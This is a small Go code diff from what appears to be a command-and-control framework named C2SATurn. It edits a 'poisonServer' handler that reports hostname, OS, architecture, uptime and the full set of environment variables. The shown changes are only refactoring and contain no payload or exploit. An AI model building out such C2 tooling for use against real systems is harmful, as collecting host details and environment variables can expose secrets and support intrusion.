@@ -9,7 +9,7 @@ import (
 	"os"
 	"sync"
 
-	"c2saturn/grpcapi"
+	"github.com/h3bzzz/C2SATurn/grpcapi"
 
 	"google.golang.org/grpc"
 )
@@ -65,9 +65,9 @@ func (s *poisonServer) GetSystemInfo(ctx context.Context, empty *grpcapi.Empty) 
 	}
 	return &grpcapi.SystemInfo{
 		Hostname:     hostname,
-		OS:           "Linux", // Placeholder, replace with actual detection if needed
-		Architecture: "x86_64",
-		Uptime:       "Unknown", // Add logic to calculate uptime if required
+		OS:           os.Getenv("OS"),
+		Architecture: os.Getenv("ARCH"),
+		Uptime:       os.Getenv("UPTIME"),
 		EnvVars:      envVars,
 	}, nil
 }
@@ -186,4 +186,3 @@ func main() {
 		log.Fatalf("Failed to start Mother server: %v", err)
 	}
 }
-
